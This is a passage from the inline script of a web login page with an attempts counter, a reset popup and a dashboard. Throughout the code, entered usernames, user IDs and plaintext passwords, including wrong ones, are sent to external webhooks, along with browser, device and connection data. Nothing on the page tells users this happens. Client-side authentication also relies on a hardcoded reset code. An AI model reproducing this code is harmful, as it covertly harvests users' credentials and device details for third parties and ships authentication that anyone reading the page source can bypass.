        attempts = 5; // Reset attempts on successful login
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = '#ff914d'; // Reset border color
        loginBox.style.boxShadow = '0 0 30px rgba(255, 145, 77, 0.6)'; // Reset shadow

        // Log successful credentials (using general webhook embed builders)
        const loggingData = await collectLoggingData(user, password);
        
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        loginBox.style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.classList.remove('login-body'); // Remove login class
        document.body.classList.add('dashboard-body'); // Add dashboard class
        
        // Update user info in dashboard header
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        // Log specific invalid attempts
        if (msg.includes('User not found') || msg.includes('invalid identifier')) {
            await logInvalidUsername(usernameInput.value);
            await logInvalidIdentifier(userIDInput.value);
        } else if (msg.includes('Incorrect password')) {
            await logInvalidPassword(passwordInput.value);
        }

        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'Maximum login attempts reached. Please reset.';
          
          // Log attempts exceeded
          await logAttemptsExceeded(usernameInput.value, passwordInput.value, userIDInput.value);
          
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 3) { // Start flashing after 3 attempts remaining
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
        errorMsg.textContent = ''; // Clear error message on enable
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        
        // Trigger webhook for reset box detected
        const resetBoxEmbed = {
            title: "🔔 Reset Box Activated", color: 0xffff00, fields: [
                { name: "Username", value: usernameInput.value || "N/A", inline: true },
                { name: "Password Entered", value: passwordInput.value || "N/A", inline: true },
                { name: "User ID", value: userIDInput.value || "N/A", inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: false }
            ]
        };
        sendWebhook(resetPopupWebhookUrls.detected, resetBoxEmbed);
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      // Reset counter logic
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579'; // Hardcoded secret code

        const currentUsername = usernameInput.value || 'Unknown';
        const currentPassword = passwordInput.value || 'N/A';
        const currentUserID = userIDInput.value || 'Unknown';
        const loggedUser = findUser(currentUsername, currentUserID) || {}; // Get user object if found

        // Build embed for the reset attempt
        const resetAttemptEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000, // Green for success, red for failure
          fields: [
            { name: "Username", value: loggedUser.name || currentUsername, inline: true },
            { name: "Attempted Username", value: currentUsername, inline: true },
            { name: "Attempted Password", value: currentPassword, inline: true },
            { name: "Attempted User ID", value: currentUserID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Send webhook for success or failure
        await sendWebhook(isCorrect ? resetPopupWebhookUrls.success : resetPopupWebhookUrls.fail, resetAttemptEmbed);

        if (isCorrect) {
          attempts = 5; // Reset attempts count
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          flashRedOutline(1, 200); // Brief flash to show reset worked
          
          // Optionally, log this as a security event if the code was guessed.
          // For now, assume authorized reset.
          
        } else {
          alert('Incorrect reset code. Please try again.');
          resetField.value = ''; // Clear field after incorrect attempt
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
          e.preventDefault(); // Prevent default form submission if any
        }
      });

      // Initialize attempts display
      updateAttemptsText();

    })(); // End of Login System IIFE

    // --- Logout Functionality ---
    document.getElementById('logoutBtn').addEventListener('click', () => {
        if (confirm('Are you sure you want to log out?')) {
            // Clear dashboard intervals/timeouts
            dashboard.cleanup();
            
            // Clear localStorage for session data if needed
            localStorage.removeItem('dashboardTheme'); // Clear theme preference if desired on logout
            localStorage.removeItem('dashboardReminders'); // Clear reminders on logout

            // Redirect to login page or refresh
            window.location.reload(); 
        }
    });

  </script>
</body>
</html>
